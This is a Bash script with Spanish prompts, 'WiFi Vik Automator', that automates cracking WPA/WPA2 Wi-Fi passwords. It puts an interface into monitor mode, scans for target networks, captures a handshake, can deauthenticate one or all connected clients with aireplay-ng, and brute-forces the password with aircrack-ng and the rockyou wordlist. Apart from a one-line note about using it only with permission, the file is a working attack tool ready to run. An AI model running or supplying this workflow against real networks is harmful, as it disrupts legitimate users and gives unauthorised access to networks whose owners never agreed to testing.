#!/bin/bash
# ===========================================================
#                 WiFi Vik Automator
#         "Hack the planet... Legally!"
# ===========================================================

# Colores para la terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin color

echo -e "${GREEN}Bienvenido a Wifi Vik - Automatizador WPA/WPA2${NC}"
echo -e "${YELLOW}Nota: Usa esto solo para redes propias o con permiso.${NC}\n"

# Verificar e instalar dos2unix si es necesario
if ! command -v dos2unix &> /dev/null
then
    echo -e "${YELLOW}Instalando dos2unix...${NC}"
    sudo apt update && sudo apt install -y dos2unix
    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: No se pudo instalar dos2unix.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}dos2unix ya está instalado.${NC}"
fi

# Convertir el archivo al formato correcto
script_name="$0"
echo -e "${YELLOW}Convirtiendo el archivo al formato Linux...${NC}"
dos2unix "$script_name"

# Paso 1: Seleccionar la interfaz WiFi
echo -e "${YELLOW}Paso 1: Listando interfaces WiFi...${NC}"
iwconfig
read -p "Introduce tu interfaz WiFi (ejemplo: wlan0): " interface

# Paso 2: Activar modo monitor
echo -e "${YELLOW}Paso 2: Activando modo monitor en $interface...${NC}"
airmon-ng start $interface
interface_mon="${interface}mon"

# Verificar modo monitor
if iwconfig $interface_mon | grep -q "Mode:Monitor"; then
    echo -e "${GREEN}Modo monitor activado: $interface_mon${NC}"
else
    echo -e "${RED}Error: No se pudo activar el modo monitor.${NC}"
    exit 1
fi

# Paso 3: Escanear redes
echo -e "${YELLOW}Paso 3: Escaneando redes cercanas...${NC}"
echo -e "${YELLOW}El escaneo durará 1 minuto. Presiona Ctrl+C para detenerlo manualmente si encuentras la red antes.${NC}"
sleep 2
timeout 60s airodump-ng $interface_mon

# Recomendaciones de redes óptimas
read -p "¿Deseas ver las recomendaciones de redes óptimas? (s/n): " recommend_choice
if [[ "$recommend_choice" == "s" ]]; then
    echo -e "${YELLOW}Redes óptimas según la señal y actividad:${NC}"
    echo -e "${GREEN}- Redes con mayor potencia de señal (PWR cercano a 0).${NC}"
    echo -e "${GREEN}- Redes con clientes activos (STAIONs detectados).${NC}"
    echo -e "${GREEN}- Redes con menos interferencias en el canal utilizado.${NC}"
    echo -e "${YELLOW}Revisa la salida de airodump-ng para elegir una red apropiada.${NC}"
fi

# Paso 4: Captura de paquetes
read -p "Introduce el BSSID de la red objetivo: " bssid
read -p "Introduce el canal (CH) de la red: " channel
read -p "Introduce un nombre para el archivo de salida: " output

echo -e "${YELLOW}Iniciando captura de paquetes para $bssid en el canal $channel...${NC}"
airodump-ng --bssid $bssid -c $channel -w $output $interface_mon &

echo -e "${YELLOW}Esperando handshake...${NC}"
sleep 5

# Paso 5: Ataque de desautenticación (opcional)
read -p "¿Quieres desautenticar clientes? (s/n): " deauth_choice
if [[ "$deauth_choice" == "s" ]]; then
    read -p "Introduce la MAC de un cliente (o deja vacío para atacar a todos): " client_mac
    if [[ -z "$client_mac" ]]; then
        echo -e "${YELLOW}Desautenticando todos los clientes...${NC}"
        aireplay-ng --deauth 10 -a $bssid $interface_mon
    else
        echo -e "${YELLOW}Desautenticando cliente $client_mac...${NC}"
        aireplay-ng --deauth 10 -a $bssid -c $client_mac $interface_mon
    fi
else
    echo -e "${YELLOW}Saltando ataque de desautenticación.${NC}"
fi

# Paso 6: Detener captura
read -p "¿Listo para detener la captura? (s/n): " stop_capture
if [[ "$stop_capture" == "s" ]]; then
    pkill -f "airodump-ng"
    echo -e "${GREEN}Captura detenida.${NC}"
fi

# Paso 7: Crackear la contraseña
read -p "¿Quieres intentar crackear el handshake? (s/n): " crack_choice
if [[ "$crack_choice" == "s" ]]; then
    read -p "Introduce la ruta al diccionario (default: /usr/share/wordlists/rockyou.txt): " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    echo -e "${YELLOW}Crackeando el handshake con $wordlist...${NC}"
    aircrack-ng -w $wordlist -b $bssid ${output}-01.cap
else
    echo -e "${YELLOW}Saltando crackeo.${NC}"
fi

# Paso 8: Detener modo monitor
echo -e "${YELLOW}Desactivando modo monitor...${NC}"
airmon-ng stop $interface_mon
echo -e "${GREEN}Modo monitor desactivado.${NC}"

echo -e "${GREEN}¡Proceso completado!${NC}"
exit 0
